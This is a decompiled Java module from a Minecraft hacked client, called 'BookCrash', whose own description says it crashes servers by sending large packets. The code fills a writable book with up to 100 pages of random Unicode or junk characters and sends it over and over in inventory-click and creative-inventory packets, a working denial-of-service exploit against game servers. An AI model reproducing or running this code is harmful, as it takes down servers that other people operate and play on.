//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "/Users/imac/Downloads/Minecraft-Deobfuscator3000-master/1.12 stable mappings"!

//Decompiled by Procyon!

package me.zeroeightsix.kami.module.modules.misc;

import me.zeroeightsix.kami.module.*;
import me.zeroeightsix.kami.setting.*;
import net.minecraft.client.*;
import me.zeroeightsix.kami.command.*;
import net.minecraft.init.*;
import net.minecraft.item.*;
import java.util.*;
import net.minecraft.nbt.*;
import net.minecraft.inventory.*;
import net.minecraft.network.*;
import net.minecraft.network.play.client.*;
import java.util.stream.*;

@Info(name = "BookCrash", category = Category.HIDDEN, description = "Crashes servers by sending large packets")
public class BookCrash extends Module
{
    private int currDelay;
    private Setting<Mode> mode;
    private Setting<FillMode> fillMode;
    private Setting<Integer> uses;
    private Setting<Integer> delay;
    private Setting<Integer> pagesSettings;
    private Setting<Boolean> autoToggle;
    
    public BookCrash() {
        this.mode = this.register(Settings.e("Mode", Mode.RAION));
        this.fillMode = this.register(Settings.e("Fill Mode", FillMode.RANDOM));
        this.uses = this.register(Settings.i("Uses", 5));
        this.delay = this.register(Settings.i("Delay", 0));
        this.pagesSettings = this.register(Settings.i("Pages", 50));
        this.autoToggle = this.register(Settings.b("AutoToggle", true));
    }
    
    @Override
    public void onUpdate() {
        if (Minecraft.getMinecraft().getCurrentServerData() == null || Minecraft.getMinecraft().getCurrentServerData().serverIP.isEmpty()) {
            Command.sendChatMessage("Not connected to a server");
            this.disable();
        }
        this.currDelay = ((this.currDelay >= this.delay.getValue()) ? 0 : (this.delay.getValue() + 1));
        if (this.currDelay > 0) {
            return;
        }
        final ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
        final NBTTagList list = new NBTTagList();
        final NBTTagCompound tag = new NBTTagCompound();
        final String author = "Bella";
        final String title = "\n Bella Nuzzles You \n";
        String size = "";
        final int pages = Math.min(this.pagesSettings.getValue(), 100);
        final int pageChars = 210;
        if (this.fillMode.getValue().equals(FillMode.RANDOM)) {
            final IntStream chars = new Random().ints(128, 1112063).map(i -> (i < 55296) ? i : (i + 2048));
            size = chars.limit(pageChars * pages).mapToObj(i -> String.valueOf((char)i)).collect((Collector<? super Object, ?, String>)Collectors.joining());
        }
        else if (this.fillMode.getValue().equals(FillMode.FFFF)) {
            size = repeat(pages * pageChars, String.valueOf(1114111));
        }
        else if (this.fillMode.getValue().equals(FillMode.ASCII)) {
            final IntStream chars = new Random().ints(32, 126);
            size = chars.limit(pageChars * pages).mapToObj(i -> String.valueOf((char)i)).collect((Collector<? super Object, ?, String>)Collectors.joining());
        }
        else if (this.fillMode.getValue().equals(FillMode.OLD)) {
            size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
        }
        for (int j = 0; j < pages; ++j) {
            final String siteContent = size;
            final NBTTagString tString = new NBTTagString(siteContent);
            list.appendTag((NBTBase)tString);
        }
        tag.setString("author", author);
        tag.setString("title", title);
        tag.setTag("pages", (NBTBase)list);
        bookObj.setTagInfo("pages", (NBTBase)list);
        bookObj.setTagCompound(tag);
        for (int j = 0; j < this.uses.getValue(); ++j) {
            BookCrash.mc.playerController.connection.sendPacket((Packet)new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, (short)0));
            if (this.mode.getValue() == Mode.JESSICA) {
                BookCrash.mc.playerController.connection.sendPacket((Packet)new CPacketCreativeInventoryAction(0, bookObj));
            }
        }
    }
    
    private static String repeat(final int count, final String with) {
        return new String(new char[count]).replace("\u0000", with);
    }
    
    private enum Mode
    {
        JESSICA, 
        RAION;
    }
    
    private enum FillMode
    {
        ASCII, 
        FFFF, 
        RANDOM, 
        OLD;
    }
}
